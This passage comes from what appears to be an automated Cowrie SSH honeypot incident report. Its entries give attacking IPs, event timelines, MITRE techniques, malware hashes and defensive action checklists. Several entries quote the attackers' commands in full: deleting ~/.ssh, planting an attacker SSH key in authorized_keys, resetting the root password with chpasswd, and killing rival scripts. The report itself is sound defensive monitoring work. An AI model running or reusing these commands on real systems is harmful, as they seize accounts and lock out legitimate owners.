| `2026-04-17 02:57:36` | `cowrie.session.params` |
| `2026-04-17 02:57:36` | `cowrie.command.input` |
| `2026-04-17 02:57:36` | `cowrie.session.file_download` |
| `2026-04-17 02:57:36` | `cowrie.log.closed` |
| `2026-04-17 02:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-490b8dcd06a9

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 02:57 |
| **Last Seen** | 2026-04-17 02:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:57:38` | `cowrie.session.connect` |
| `2026-04-17 02:57:38` | `cowrie.client.version` |
| `2026-04-17 02:57:38` | `cowrie.client.kex` |
| `2026-04-17 02:57:39` | `cowrie.login.success` |
| `2026-04-17 02:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b44fb3f31d39

| Field | Detail |
|---|---|
| **Source IP** | `58.42.8[.]7` |
| **First Seen** | 2026-04-17 02:58 |
| **Last Seen** | 2026-04-17 02:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uG1L82S4KCnx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:58:02` | `cowrie.session.connect` |
| `2026-04-17 02:58:02` | `cowrie.client.version` |
| `2026-04-17 02:58:03` | `cowrie.client.kex` |
| `2026-04-17 02:58:03` | `cowrie.login.success` |
| `2026-04-17 02:58:04` | `cowrie.session.params` |
| `2026-04-17 02:58:04` | `cowrie.command.input` |
| `2026-04-17 02:58:04` | `cowrie.command.failed` |
| `2026-04-17 02:58:04` | `cowrie.log.closed` |
| `2026-04-17 02:58:04` | `cowrie.session.params` |
| `2026-04-17 02:58:04` | `cowrie.command.input` |
| `2026-04-17 02:58:04` | `cowrie.session.file_download` |
| `2026-04-17 02:58:04` | `cowrie.log.closed` |
| `2026-04-17 02:58:14` | `cowrie.session.params` |
| `2026-04-17 02:58:14` | `cowrie.command.input` |
| `2026-04-17 02:58:14` | `cowrie.log.closed` |
| `2026-04-17 02:58:15` | `cowrie.session.params` |
| `2026-04-17 02:58:15` | `cowrie.command.input` |
| `2026-04-17 02:58:15` | `cowrie.log.closed` |
| `2026-04-17 02:58:15` | `cowrie.session.params` |
| `2026-04-17 02:58:15` | `cowrie.command.input` |
| `2026-04-17 02:58:15` | `cowrie.session.file_download` |
| `2026-04-17 02:58:15` | `cowrie.log.closed` |
| `2026-04-17 02:58:16` | `cowrie.session.params` |
| `2026-04-17 02:58:16` | `cowrie.command.input` |
| `2026-04-17 02:58:16` | `cowrie.log.closed` |
| `2026-04-17 02:58:16` | `cowrie.session.params` |
| `2026-04-17 02:58:16` | `cowrie.command.input` |
| `2026-04-17 02:58:16` | `cowrie.log.closed` |
| `2026-04-17 02:58:17` | `cowrie.session.params` |
| `2026-04-17 02:58:17` | `cowrie.command.input` |
| `2026-04-17 02:58:17` | `cowrie.command.input` |
| `2026-04-17 02:58:17` | `cowrie.log.closed` |
| `2026-04-17 02:58:17` | `cowrie.session.params` |
| `2026-04-17 02:58:17` | `cowrie.command.input` |
| `2026-04-17 02:58:17` | `cowrie.log.closed` |
| `2026-04-17 02:58:18` | `cowrie.session.params` |
| `2026-04-17 02:58:18` | `cowrie.command.input` |
| `2026-04-17 02:58:18` | `cowrie.log.closed` |
| `2026-04-17 02:58:18` | `cowrie.session.params` |
| `2026-04-17 02:58:18` | `cowrie.command.input` |
| `2026-04-17 02:58:18` | `cowrie.log.closed` |
| `2026-04-17 02:58:19` | `cowrie.session.params` |
| `2026-04-17 02:58:19` | `cowrie.command.input` |
| `2026-04-17 02:58:19` | `cowrie.log.closed` |
| `2026-04-17 02:58:19` | `cowrie.session.params` |
| `2026-04-17 02:58:19` | `cowrie.command.input` |
| `2026-04-17 02:58:19` | `cowrie.log.closed` |
| `2026-04-17 02:58:20` | `cowrie.session.params` |
| `2026-04-17 02:58:20` | `cowrie.command.input` |
| `2026-04-17 02:58:20` | `cowrie.log.closed` |
| `2026-04-17 02:58:20` | `cowrie.session.params` |
| `2026-04-17 02:58:20` | `cowrie.command.input` |
| `2026-04-17 02:58:20` | `cowrie.log.closed` |
| `2026-04-17 02:58:21` | `cowrie.session.params` |
| `2026-04-17 02:58:21` | `cowrie.command.input` |
| `2026-04-17 02:58:21` | `cowrie.log.closed` |
| `2026-04-17 02:58:21` | `cowrie.session.params` |
| `2026-04-17 02:58:21` | `cowrie.command.input` |
| `2026-04-17 02:58:22` | `cowrie.log.closed` |
| `2026-04-17 02:58:22` | `cowrie.session.params` |
| `2026-04-17 02:58:22` | `cowrie.command.input` |
| `2026-04-17 02:58:22` | `cowrie.log.closed` |
| `2026-04-17 02:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.42.8[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.42.8[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0447b0c723a8

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:58 |
| **Last Seen** | 2026-04-17 02:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:58:19` | `cowrie.session.connect` |
| `2026-04-17 02:58:19` | `cowrie.client.version` |
| `2026-04-17 02:58:19` | `cowrie.client.kex` |
| `2026-04-17 02:58:19` | `cowrie.login.success` |
| `2026-04-17 02:58:19` | `cowrie.session.params` |
| `2026-04-17 02:58:19` | `cowrie.command.input` |
| `2026-04-17 02:58:19` | `cowrie.command.failed` |
| `2026-04-17 02:58:19` | `cowrie.log.closed` |
| `2026-04-17 02:58:20` | `cowrie.session.params` |
| `2026-04-17 02:58:20` | `cowrie.command.input` |
| `2026-04-17 02:58:20` | `cowrie.session.file_download` |
| `2026-04-17 02:58:20` | `cowrie.log.closed` |
| `2026-04-17 02:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3826c9dd9e

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:58 |
| **Last Seen** | 2026-04-17 02:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:58:21` | `cowrie.session.connect` |
| `2026-04-17 02:58:21` | `cowrie.client.version` |
| `2026-04-17 02:58:21` | `cowrie.client.kex` |
| `2026-04-17 02:58:22` | `cowrie.login.success` |
| `2026-04-17 02:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b982d2b63eae

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:59 |
| **Last Seen** | 2026-04-17 02:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:59:38` | `cowrie.session.connect` |
| `2026-04-17 02:59:38` | `cowrie.client.version` |
| `2026-04-17 02:59:38` | `cowrie.client.kex` |
| `2026-04-17 02:59:40` | `cowrie.login.success` |
| `2026-04-17 02:59:40` | `cowrie.session.params` |
| `2026-04-17 02:59:40` | `cowrie.command.input` |
| `2026-04-17 02:59:40` | `cowrie.command.failed` |
| `2026-04-17 02:59:41` | `cowrie.log.closed` |
| `2026-04-17 02:59:41` | `cowrie.session.params` |
| `2026-04-17 02:59:41` | `cowrie.command.input` |
| `2026-04-17 02:59:42` | `cowrie.session.file_download` |
| `2026-04-17 02:59:42` | `cowrie.log.closed` |
| `2026-04-17 02:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2721e60d96a

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:59 |
| **Last Seen** | 2026-04-17 02:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:59:45` | `cowrie.session.connect` |
| `2026-04-17 02:59:45` | `cowrie.client.version` |
| `2026-04-17 02:59:46` | `cowrie.client.kex` |
| `2026-04-17 02:59:47` | `cowrie.login.success` |
| `2026-04-17 02:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc518ba914ff

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:59 |
| **Last Seen** | 2026-04-17 02:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:59:52` | `cowrie.session.connect` |
| `2026-04-17 02:59:52` | `cowrie.client.version` |
| `2026-04-17 02:59:52` | `cowrie.client.kex` |
| `2026-04-17 02:59:53` | `cowrie.login.success` |
| `2026-04-17 02:59:53` | `cowrie.session.params` |
| `2026-04-17 02:59:53` | `cowrie.command.input` |
| `2026-04-17 02:59:53` | `cowrie.command.failed` |
| `2026-04-17 02:59:53` | `cowrie.log.closed` |
| `2026-04-17 02:59:53` | `cowrie.session.params` |
| `2026-04-17 02:59:53` | `cowrie.command.input` |
| `2026-04-17 02:59:53` | `cowrie.session.file_download` |
| `2026-04-17 02:59:53` | `cowrie.log.closed` |
| `2026-04-17 02:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46500e796b0

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:59 |
| **Last Seen** | 2026-04-17 02:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:59:55` | `cowrie.session.connect` |
| `2026-04-17 02:59:55` | `cowrie.client.version` |
| `2026-04-17 02:59:55` | `cowrie.client.kex` |
| `2026-04-17 02:59:55` | `cowrie.login.success` |
| `2026-04-17 02:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75748d38fe32

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:00 |
| **Last Seen** | 2026-04-17 03:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:00:28` | `cowrie.session.connect` |
| `2026-04-17 03:00:28` | `cowrie.client.version` |
| `2026-04-17 03:00:29` | `cowrie.client.kex` |
| `2026-04-17 03:00:30` | `cowrie.login.success` |
| `2026-04-17 03:00:31` | `cowrie.session.params` |
| `2026-04-17 03:00:31` | `cowrie.command.input` |
| `2026-04-17 03:00:31` | `cowrie.command.failed` |
| `2026-04-17 03:00:31` | `cowrie.log.closed` |
| `2026-04-17 03:00:32` | `cowrie.session.params` |
| `2026-04-17 03:00:32` | `cowrie.command.input` |
| `2026-04-17 03:00:32` | `cowrie.session.file_download` |
| `2026-04-17 03:00:32` | `cowrie.log.closed` |
| `2026-04-17 03:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cbfade0224

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:00 |
| **Last Seen** | 2026-04-17 03:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:00:36` | `cowrie.session.connect` |
| `2026-04-17 03:00:36` | `cowrie.client.version` |
| `2026-04-17 03:00:36` | `cowrie.client.kex` |
| `2026-04-17 03:00:37` | `cowrie.login.success` |
| `2026-04-17 03:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d7b35c68c5

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:19` | `cowrie.session.connect` |
| `2026-04-17 03:01:19` | `cowrie.client.version` |
| `2026-04-17 03:01:19` | `cowrie.client.kex` |
| `2026-04-17 03:01:20` | `cowrie.login.success` |
| `2026-04-17 03:01:20` | `cowrie.session.params` |
| `2026-04-17 03:01:20` | `cowrie.command.input` |
| `2026-04-17 03:01:20` | `cowrie.command.failed` |
| `2026-04-17 03:01:20` | `cowrie.log.closed` |
| `2026-04-17 03:01:20` | `cowrie.session.params` |
| `2026-04-17 03:01:20` | `cowrie.command.input` |
| `2026-04-17 03:01:21` | `cowrie.session.file_download` |
| `2026-04-17 03:01:21` | `cowrie.log.closed` |
| `2026-04-17 03:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40ab7991202

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:19` | `cowrie.session.connect` |
| `2026-04-17 03:01:19` | `cowrie.client.version` |
| `2026-04-17 03:01:20` | `cowrie.client.kex` |
| `2026-04-17 03:01:21` | `cowrie.login.success` |
| `2026-04-17 03:01:22` | `cowrie.session.params` |
| `2026-04-17 03:01:22` | `cowrie.command.input` |
| `2026-04-17 03:01:22` | `cowrie.command.failed` |
| `2026-04-17 03:01:22` | `cowrie.log.closed` |
| `2026-04-17 03:01:23` | `cowrie.session.params` |
| `2026-04-17 03:01:23` | `cowrie.command.input` |
| `2026-04-17 03:01:23` | `cowrie.session.file_download` |
| `2026-04-17 03:01:23` | `cowrie.log.closed` |
| `2026-04-17 03:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65c9c0627bd

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:23` | `cowrie.session.connect` |
| `2026-04-17 03:01:23` | `cowrie.client.version` |
| `2026-04-17 03:01:23` | `cowrie.client.kex` |
| `2026-04-17 03:01:24` | `cowrie.login.success` |
| `2026-04-17 03:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b243138e81f

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:27` | `cowrie.session.connect` |
| `2026-04-17 03:01:27` | `cowrie.client.version` |
| `2026-04-17 03:01:27` | `cowrie.client.kex` |
| `2026-04-17 03:01:28` | `cowrie.login.success` |
| `2026-04-17 03:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0a41dce137

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
